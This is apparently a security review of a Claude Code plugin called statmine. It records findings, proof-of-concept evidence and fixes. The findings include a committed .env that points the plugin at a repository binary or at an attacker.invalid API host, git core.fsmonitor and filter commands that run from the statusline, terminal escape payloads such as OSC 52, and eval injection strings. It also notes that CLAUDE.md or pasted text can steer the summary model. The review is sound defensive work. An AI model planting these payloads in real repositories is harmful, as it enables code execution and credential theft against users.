# Security review: statmine 2.0.0

Date: 2026-10-23. Branch: `release/2.0.0` at `cdfa7d4`.
Reviewer: a fresh-context security pass, with no maker notes.

## Verdict

Not release-ready as is. Three findings are Musts:

1. **M1.** Bun loads the session folder's `.env` into the prompt hook and the summary worker. A repository can use this to run its own code, or to send your prompt text and Claude credentials to its own server.
2. **M2.** The statusline runs `git status` in whatever folder the session is in, every redraw. Git config in that folder (`core.fsmonitor`, filter drivers, the same in submodules) then runs commands, with no permission prompt.
3. **M3.** Control characters in prompt text, summaries and folder names reach the terminal raw. A channel message or a hostile folder name can write terminal escape sequences, such as OSC 52 (clipboard write) or OSC 8 (links).

Each Must has a small fix. The fixes are listed with each finding.

## Scope

All code in the repository at the commit above:

- `hooks/on-prompt.ts`: prompt logging, slot locks, job files, the detached worker.
- `hooks/lib/inference.ts`: the `claude` CLI call.
- `hooks/sync.sh`, `hooks/hooks.json`.
- `scripts/statusline.sh`: jq parsing, `eval` of `@sh` output, git calls, file reads.
- `skills/setup/SKILL.md`, `skills/mode/SKILL.md`: they write `~/.claude/settings.json` and the data folder.
- `.claude-plugin/*.json`, `.github/workflows/test.yml`, `tests/` (for secrets only).
- File modes, in the repo and in a data folder the hook creates.

Out of scope: Claude Code itself, Bun, git, jq and the terminal.

## Method

- Read every file above, and `docs/how-it-works.md` for the claimed properties.
- Threat model: a hostile repository or archive (its files, folder names, `.env`, git config), a hostile channel message or paste, a model output steered by prompt injection, other local users, and denial of service of the prompt path.
- Every claim below marked **Confirmed** was reproduced in a scratch folder under `/tmp/claude-1000/statmine-release/sec/`. The tests used a stub `claude` that only writes a file. No real model was called, no network was used, and `~/.claude` was not touched.
- Tool versions: Bun 1.3.6, git 2.43.0, jq 1.7, Claude Code CLI on PATH (its `--help` only).

Severity:

- **Must:** exploitable, or leaks private data. Fix before release.
- **Should:** a real weakness that needs an unusual setup, or hardening of a trusted input. Fix soon.
- **Note:** low risk, or a record of a check that passed.

## Summary

| ID | Severity | Status | Finding |
|----|----------|--------|---------|
| M1 | Must | Fixed (hooks.json flag pending, see M1) | Bun loads the session folder's `.env` into the hook and the worker |
| M2 | Must | Fixed | Git config in the session folder runs commands from the statusline |
| M3 | Must | Fixed | Control characters reach the terminal raw |
| S1 | Should | Plausible | The summary `claude` runs in the project folder with MCP, CLAUDE.md and saved sessions |
| S2 | Should | Confirmed | A relative `PATH` entry lets the project's own `./claude` run |
| S3 | Should | Confirmed | Numeric statusline fields are `eval`ed and used in arithmetic without quoting |
| S4 | Should | Confirmed | `stripChannels` is quadratic; a large paste can stall the prompt for the full hook timeout |
| S5 | Should | Confirmed by reading | `/statmine:setup` can widen the mode of `settings.json` and replaces a symlink |
| S6 | Should | Confirmed by reading | Orphaned job files keep full prompt text with no expiry |
| S7 | Should | Fixed | CI actions are pinned by tag, not by commit |
| N1-N8 | Note | | See the Notes section |

## Must

### M1. Bun loads the session folder's `.env` into the hook and the worker

**Where:** `hooks/hooks.json` (the `UserPromptSubmit` args), `hooks/on-prompt.ts` (the worker `spawn`), `hooks/lib/inference.ts` (`claudeBinary()` and the child env).

**What:** Claude Code runs the prompt hook with the session's folder as its working directory. Bun reads `.env`, `.env.local` and the other `.env.*` files from the working directory at startup. `--config=/dev/null` stops `bunfig.toml`, but not `.env`. The worker is spawned the same way, so it reads the `.env` again. Variables that are already set are not overridden. Variables that are unset are added.

`.env` files are often committed to repositories. A repository can therefore set:

- `CLAUDE_BIN=/proc/self/cwd/bin/claude`. It is absolute, so `claudeBinary()` accepts it. The worker runs the repository's own program on every long prompt. That is code execution as the user, with no permission prompt, from a plain `git clone` plus a long prompt.
- `ANTHROPIC_BASE_URL`, `HTTPS_PROXY` and `NODE_EXTRA_CA_CERTS`. The worker passes its whole environment to `claude`. The summary call then sends your full prompt text to the repository's chosen host or proxy, together with whatever credentials the CLI sends to that endpoint.

Whether Claude Code's own process also loads the project's `.env` was not checked. Either way, statmine adds a new path from it to code execution.

**Evidence (Confirmed):**

```
envrepo/.env:        CLAUDE_BIN=/proc/self/cwd/bin/claude
envrepo/bin/claude:  writes pwned.txt, prints "Fix it"
$ cd envrepo; <long prompt JSON> | bun --config=/dev/null run hooks/on-prompt.ts
pwned.txt:           PWNED-by-repo-claude manos
summaries.jsonl:     {"session_id":"s1",...,"summary":"Fix it"}
```

A second `.env` with `ANTHROPIC_BASE_URL=https://attacker.invalid`, `HTTPS_PROXY=...` and `NODE_EXTRA_CA_CERTS=...` (and a recording stub as `claude`): all three values reached the `claude` child's environment.

Adding `--no-env-file` to the hook command alone did **not** fix it: the worker loaded the `.env` again and ran the repository's binary. Adding it to both the hook and the worker spawn fixed it.

**Fix:**

1. `hooks/hooks.json`: args `["--no-env-file", "--config=/dev/null", "run", "${CLAUDE_PLUGIN_ROOT}/hooks/on-prompt.ts"]`.
2. `hooks/on-prompt.ts`, worker spawn: `[ '--no-env-file', '--config=/dev/null', 'run', import.meta.path, '--worker', ... ]`, and spawn it with `cwd: dataDir()`, so the worker and `claude` never start in the project folder.
3. Add a test: a `.env` in the hook's working directory sets `CLAUDE_BIN` to a recording stub. Assert that the stub is never run.
4. State the lowest Bun version that has `--no-env-file` in the README requirements. Bun 1.3.6 (the CI version) has it. An older Bun rejects the flag, and the hook then fails, so the minimum must be stated.

**Status:** Fixed in `hooks/on-prompt.ts`. The worker is spawned with `--no-env-file` and `cwd: dataDir()`. The hook starts no worker, and the worker runs no `claude`, unless its own process was started with `--no-env-file` (`process.execArgv`). So a hook started without the flag logs the prompt but makes no summary. `hooks/hooks.json` now starts the hook with `--no-env-file`, so summaries run in the shipped config. The README and the user guide state Bun 1.3.6 or later. Tests in `tests/security.test.ts`: `M1: hooks.json starts the prompt hook with --no-env-file`, `M1: a .env in the session folder never picks the claude binary or the API host`, `M1: a hook started without --no-env-file starts no summary worker`, `M1: a worker started without --no-env-file refuses to run`. The tests run the hook with the args from `hooks/hooks.json`. Tested on Bun 1.3.6; an older minimum was not checked.

### M2. Git config in the session folder runs commands from the statusline

**Where:** `scripts/statusline.sh`, the commit cell (`git ... status --porcelain` and the other git calls).

**What:** The statusline runs `git status` in `workspace.current_dir` at every redraw, at least every 10 seconds. That folder follows the session into subfolders and other repositories. Git runs commands named in the repository's own `.git/config`:

- `core.fsmonitor` runs on every `git status`. It also runs in each submodule, from the submodule's config.
- A `filter.<name>.clean` driver, enabled by `.gitattributes`, runs when a file's stat data looks changed.

A clone cannot carry `.git/config`. But an extracted archive, a copied folder, a repository shared from another tool, or a file edit by an agent (in `acceptEdits` mode, for example) can. Once that config exists, statmine runs the command every redraw. It runs outside Claude Code's permission system and sandbox, with no prompt. `safe.directory` does not help: it only refuses repositories owned by another user.

**Evidence (Confirmed):**

```
hostile/.git/config:  core.fsmonitor = sh -c 'echo fsmonitor-ran >> fs-pwned.txt'; false #
$ <statusline JSON with current_dir=hostile> | bash scripts/statusline.sh
fs-pwned.txt:  fsmonitor-ran  (twice per render)

hostile2: .gitattributes "a.txt filter=x", .git/config filter.x.clean = sh -c 'echo filter-ran ...; cat'
          a.txt touched to an old date
fs-pwned.txt:  filter-ran

sup/sm (a submodule) with core.fsmonitor in its own config
$ git --no-optional-locks status --porcelain   -> sub-fsmonitor (twice)
```

What stopped each one:

- `git -c core.fsmonitor=false ...` stopped fsmonitor, in submodules too (`-c` values reach git's child processes).
- `--ignore-submodules=dirty` on `status` also stopped the submodule run.
- `-c filter.x.clean=` (an empty command, built from `git config --get-regexp '^filter\..*\.(clean|process)$'`) stopped the filter.

**Fix:**

1. Run every git call through one helper that adds `-c core.fsmonitor=false`.
2. For the dirty check, add `--ignore-submodules=dirty`, and blank every configured filter `clean` and `process` command with `-c filter.<name>.clean= -c filter.<name>.process=`. Or skip the dirty marker when a filter driver with a command is configured.
3. Add tests for an fsmonitor repository and a filter repository. Assert that the marker file is never written.
4. Document the remaining risk in `how-it-works.md`: git still reads the folder's config, and new config keys that run commands may appear in later git versions.

**Status:** Fixed in `scripts/statusline.sh`. Every git call goes through `g()`, which adds `-c core.fsmonitor=false`. `status` adds `--ignore-submodules=dirty`. Every filter `clean` and `process` command that is not from the global or system config is blanked with `-c filter.<name>.clean= -c filter.<name>.process=` (found with `git config --show-scope`, which reports included files as `local`). Global filters, such as git-lfs, are kept, so they show no false `*`. A filter name that holds `=` cannot be passed to `-c`, so the dirty marker is skipped then. Tests in `tests/security.test.ts`: `M2: a repo-local core.fsmonitor never runs`, `M2: a repo-local or included filter clean driver never runs`, `M2: a submodule's own core.fsmonitor never runs`.

### M3. Control characters reach the terminal raw

**Where:** `hooks/on-prompt.ts` (`oneLine()`), `scripts/statusline.sh` (the jq `row` function, and `folder`, `repo`, `branch`, `label`, `model`, `effort` in `printf`).

**What:** `oneLine()` and the statusline's `row` replace only tab, newline and carriage return. ESC (0x1b), BEL, the other C0 and C1 controls, and the bidi overrides (U+202E and others) stay. The statusline then prints them as raw bytes. Sources that are not the user's own typing:

- Channel messages (for example Telegram) are logged as your prompts. Their text comes from whoever can post in that chat.
- Pastes, from a web page or a log.
- Summaries: model output, which a pasted document can steer.
- Folder names. Git allows ESC in tracked path names: a folder named `a ESC]0;T BEL b` was committed and came through `git clone` intact. The folder name is printed when the session is in it. A repository name comes from a folder name too.

The bytes can write the clipboard (OSC 52), set the window title (OSC 0), add disguised links (OSC 8), clear the screen, or rewrite the statusline itself, for example to fake a green commit cell. Bidi overrides can make a branch name look like another one. Branch names cannot hold ASCII controls, but they can hold bidi characters.

Whether each sequence takes effect depends on how Claude Code passes statusline output to the terminal. That was not tested. The statusline does print colour codes on purpose, so the output is not plain text to Claude Code.

**Evidence (Confirmed for the output):**

```
channel message body: hi ESC]52;c;ZWNobyBwd25lZA==BEL ESC]0;TITLE BEL ESC[2J U+202E evil
prompts/<day>.jsonl:  "text":"hi \u001b]52;c;...\u0007 \u001b]0;TITLE\u0007 \u001b[2J‮evil"
statusline row (cat -v): ^[[2mhi ^[]52;c;ZWNobyBwd25lZA==^G ^[]0;TITLE^G ^[[2JM-bM-^@M-.evil^[[0m

folder named  x ESC]0;OWNED BEL y  (made with jq so the input JSON is valid)
git row (cat -v): ...mx^[]0;OWNED^Gy M-bM-^FM-^R x^[]0;OWNED^Gy M-bM-^NM-^G master^[[0m
```

**Fix:** remove controls at write time and again at read time, so logs written by older versions are safe too.

1. `oneLine()`: also remove `\p{Cc}` and the bidi controls `U+200E U+200F U+202A-U+202E U+2066-U+2069`. Do not remove all of `\p{Cf}`, since that would break emoji joined by U+200D. Tested: `s.replace(/[\p{Cc}]/gu, '')` removes ESC, BEL and C1.
2. The jq `row` function: `gsub("[\\p{Cc}\\x{200E}\\x{200F}\\x{202A}-\\x{202E}\\x{2066}-\\x{2069}]"; "")` (or an equivalent jq class). Tested: `gsub("[\\p{Cc}\\p{Cf}]"; "")` works in jq 1.7.
3. In bash, clean `folder`, `repo`, `branch`, `label`, `model` and `effort` before printing, for example `${v//[[:cntrl:]]/}` under a UTF-8 locale. Tested: it removes ESC and BEL and keeps `é`. Do not use byte-wise `tr` for C1, because it would cut UTF-8 characters.
4. Add tests: a logged prompt, a summary and a folder name that contain ESC, BEL and U+202E. Assert that no byte 0x1b reaches the output, except the script's own colour codes.

**Status:** Fixed. `oneLine()` removes `\p{Cc}` and U+200E, U+200F, U+202A-U+202E, U+2066-U+2069 when the hook writes. The jq `row` function removes the same set when the statusline reads. In bash, `clean()` removes the same set from the folder, repo, branch, label, version, model and effort, byte-wise under `LC_ALL=C`, so any locale works and UTF-8 text is kept. U+200D is kept, so joined emoji stay whole. Tests in `tests/security.test.ts`: `M3: oneLine removes controls and bidi overrides, and keeps text and emoji`, `M3: a channel message with escape sequences is logged without them`, `M3: prompts and summaries from older logs are cleaned at read time`, `M3: a hostile folder name, label, model and effort are printed without controls`.

## Should

### S1. The summary `claude` runs in the project folder, with MCP, CLAUDE.md and saved sessions

**Where:** `hooks/lib/inference.ts` (args), `hooks/on-prompt.ts` (the worker inherits the hook's working directory).

**What:** The `claude --print` child starts in the project folder. According to `claude --help` on this machine:

- Without `--bare`, `CLAUDE.md` files are auto-discovered. A repository's `CLAUDE.md` then reaches the summarizer, and its text can steer the summary.
- `--setting-sources ''` does not skip MCP servers ("add `--strict-mcp-config` to skip MCP servers too"). Every summary may start the user's MCP servers. `--tools ''` limits only the built-in tools, so whether MCP tools are offered to the model is not settled.
- Sessions are saved by default (`--no-session-persistence` turns this off). Each summary may become a saved session with the full prompt text, listed under the project.

**Status:** Plausible. It comes from the help text. A real `claude` run was not made, because it would write under `~/.claude`.

**Fix:** Spawn the worker with `cwd: dataDir()` (as in M1). Add `--strict-mcp-config`, `--no-session-persistence` and `--disable-slash-commands` to the args. Do not use `--bare`: it reads only `ANTHROPIC_API_KEY`, so OAuth users would lose summaries. Update the args list in `how-it-works.md`, and the stub test that records the args.

### S2. A relative `PATH` entry lets the project's own `./claude` run

**Where:** `hooks/lib/inference.ts`, `claudeBinary()`.

**What:** `Bun.which('claude')` follows relative `PATH` entries. With `PATH=.:/usr/bin` it returned `./claude`. The worker runs in the project folder, so a repository's `claude` file would run. A relative `PATH` entry is the user's own misconfiguration, but some setups have one.

**Evidence (Confirmed):** in a folder that holds an executable `claude`, `PATH=".:/usr/bin" bun -e 'console.log(Bun.which("claude"))'` printed `./claude`.

**Fix:** Accept the `Bun.which` result only when it is absolute. The `cwd: dataDir()` change from M1 also removes the project folder from the lookup.

### S3. Numeric statusline fields are `eval`ed and used in arithmetic without quoting

**Where:** `scripts/statusline.sh`, the stdin jq block (`dur_ms`, `t_in`, `t_cr`, `t_cc`, `t_out`, `ctx_max`), and the `$(( ))` lines after it.

**What:** The string fields are `@sh`-quoted. The numeric fields are only `tostring`. If one of them is ever a string, `eval` runs it. Bash arithmetic on a value such as `a[$(cmd)]` also runs `cmd`. The input comes from Claude Code, so this is hardening, not an exploit today. A bad value also makes the script exit 1, which breaks the fail-soft promise.

**Evidence (Confirmed):** `"total_duration_ms":"0; echo EVAL-INJECTED >&2"` printed `EVAL-INJECTED`. `"input_tokens":"a[$(echo ARITH-INJECTED >&2)]"` printed `ARITH-INJECTED` and the script exited with `unbound variable`.

**Fix:** In jq, turn each one into a whole number: `((.cost.total_duration_ms // 0) | tonumber? // 0 | floor | tostring)`, and do the same for the others. Optionally also check each value in bash with `case $v in ''|*[!0-9]*) v=0 ;; esac` before any arithmetic. Add a test with string values in those fields.

### S4. `stripChannels` is quadratic; a large paste can stall the prompt

**Where:** `hooks/on-prompt.ts`, `stripChannels()`.

**What:** The replace pattern scans forward from each `<channel ...>` opener with a lazy body. A text with many openers and no closers takes quadratic time. The hook runs before the prompt is sent and has a 10 second timeout.

**Evidence (Confirmed):** `'<channel a="b">x'` repeated: 40 KB took 23 ms, 200 KB took 661 ms, 400 KB took 2,773 ms. At this growth, about 800 KB passes 10 seconds. Only a very large paste of that shape triggers it, so it is a Should.

**Fix:** Bound the input. Run the channel regex and `oneLine()` on at most the first 64 KiB, since a row keeps only 200 characters. Cap the text sent to the summarizer too (for example 8 KiB). This also caps the cost of each summary call. Add a timing test with a large input.

### S5. `/statmine:setup` can widen the mode of `settings.json` and replaces a symlink

**Where:** `skills/setup/SKILL.md`, step 5.

**What:** The skill writes the new settings with `jq ... > settings.json.statmine-tmp` and then `mv`. The temp file gets the default mode (often 0644). The `mv` replaces the original file, so:

- A `settings.json` the user set to 0600, because its `env` block holds tokens, becomes readable by other local users.
- A `settings.json` that is a symlink into a dotfiles repository becomes a plain file, and the dotfiles copy stops being used.

On this machine `~/.claude` is 0755 and `settings.json` is 0644 already, so nothing changes here. The risk is for users who tightened it.

**Fix:** Run `umask 077` first. Then write the result back through the existing file (`cat tmp > ~/.claude/settings.json && rm tmp`), which keeps its mode, owner and symlink. Or check the mode first and `chmod --reference` the temp file.

### S6. Orphaned job files keep full prompt text with no expiry

**Where:** `hooks/on-prompt.ts`, `.jobs/`.

**What:** The job file holds the full prompt, not the 200-character cut. The worker deletes it after reading. If the worker dies before it reads the file (a reboot, an OOM kill, a failed Bun start), the file stays forever. Nothing sweeps `.jobs/`. That breaks the documented 7-day retention. The file is 0600, so this is a retention issue, not a leak to other users.

**Fix:** In `claimSlot()`'s sweep, also delete `.jobs/*.json` older than `STALE_MS`.

### S7. CI actions are pinned by tag, not by commit

**Status:** Fixed in 2.0.0. `.github/workflows/test.yml` pins `actions/checkout` and `oven-sh/setup-bun` to commit SHAs, and checkout sets `persist-credentials: false`.

**Where:** `.github/workflows/test.yml`.

**What:** `actions/checkout@v4` and `oven-sh/setup-bun@v2` are moving tags. If either action's tag is moved to bad code, CI runs it. `permissions: contents: read` limits the damage, and the job holds no secrets, so this is a Should for release hygiene.

**Fix:** Pin each action to a full commit SHA, with the version in a comment, and let Dependabot update them.

## Notes

- **N1. Folder modes are not tightened when they already exist.** `ensureDir()` sets 0700 only when it creates a folder. `sync.sh` runs `chmod 700` on the data folder only after the `jq` check, so without `jq` it never runs. Files are still 0600, and the installed data folder checked on this machine was 0700 with 0600 files. Fix: move the `chmod` above the `jq` check, and `chmodSync(dir, 0o700)` in `ensureDir()`.
- **N2. The session id is in the worker's argv.** Other local users can see it with `ps`. It is not secret and is not prompt text. Prompt text never reaches argv: it goes through the 0600 job file and `claude`'s stdin. That was confirmed in the code and with the stub.
- **N3. Prompt injection through summaries has a small reach.** The summarizer has `--tools ''`, its output is cut to one line of 200 characters, and it is only displayed. A pasted document can make a row say something misleading. With the M3 fix it cannot write terminal sequences. S1 covers MCP.
- **N4. The `statusLine` command is built with double quotes.** Step 5 of the setup skill builds `bash "D/statusline.sh"`. A data folder path that contains `"`, `$` or a backtick would break out of the quotes. Plugin data paths do not contain them, so this is low risk. Fix: build it with jq, `"bash " + ($d + "/statusline.sh" | @sh)`.
- **N5. Both skills grant plain `Bash`.** `allowed-tools: Bash` approves any shell command while the skill runs. Both skills can be started only by the user (`disable-model-invocation: true`), and their steps are fixed, so this is low risk. Narrower rules would be better.
- **N6. Statusline cost in very large repositories.** `git status` and `git rev-list --count HEAD` (on the trunk) run on every redraw. On a very large history this can take seconds each time. That is a cost, not a security hole. A short cache keyed by `HEAD` would fix it.
- **N7. The model option goes into argv.** `summary_model` comes from the user's own plugin options and is passed as the value after `--model`. It is not a vector.
- **N8. Other local users.** The data folder is under the user's home and is 0700. Other accounts cannot plant symlinks in it or read it. Tmp names in `sync.sh` use `$$` inside that private folder, which is fine. The slot sweep removes symlinks, not their targets. Tested: `rmSync(link, {recursive: true, force: true})` on a symlink to a folder removed the link and left the folder's file in place.

## Checks that passed

- Prompt text never appears in any process's arguments (job file, then stdin).
- Data files are created 0600 and folders 0700. `summaries.jsonl` is re-chmodded after a trim. `config.json` is written under `umask 077`.
- String fields from stdin and `config.json` are `@sh`-quoted before `eval`. jq's `@sh` quoting is safe for any string.
- `mode` is cleaned with `tr -cd 'a-z'` and matched against two values.
- The statusline shows rows only for its own session id, compares the id exactly in jq, and shows no rows for an empty id.
- `BUN_OPTIONS` is removed and `--config=/dev/null` is passed, so `bunfig.toml` cannot preload code. (`.env` is the gap; see M1.)
- `STATMINE_WORKER=1` stops the hook in the summarizer's own session.
- The hook prints nothing to stdout, so nothing it does is added to the conversation.
- Channel wrapper attributes (chat ids) are removed before anything is written or sent to a model. An unrecognised wrapper becomes `channel message`.
- No secrets or real prompt text in the repository or the tests.

## Decision record

One decision was not settled by the task: whether M2 and M3 are Musts or Shoulds.

- M2 needs `.git/config` from somewhere other than a clone. It is still a Must: it runs commands as the user with no prompt, it repeats every redraw, and it follows the session into every folder the session moves to, such as an extracted archive. Whether Claude Code's own git calls share this exposure was not checked. That would not lower statmine's part.
- M3 depends on Claude Code passing the bytes through, which was not tested. It is still a Must: the raw bytes are confirmed in statmine's output, the senders include third parties (channel messages, cloned folder names), and the fix is a few lines. If Claude Code is shown to strip these sequences, M3 becomes a Should.

A quack pass at medium effort checked this decision. Its lenses were mistakes, omissions, blindspots, unsupported claims, misleading information and internal consistency. It kept both ratings. It found three unsupported statements, and they are now fixed:

- A claim that Claude Code does not load `.env`. It is now marked as not checked.
- A claim about other tools' advisories. It was removed.
- A claim that Claude Code runs no git in the folders statmine reaches. It was replaced with what was tested.

It also asked for two claims to be tested, and both held: an ESC folder name survives `git clone`, and the slot sweep does not follow symlinks.

Scratch files from the tests are in `/tmp/claude-1000/statmine-release/sec/`. Remove them with `rm -rf /tmp/claude-1000/statmine-release/sec`.
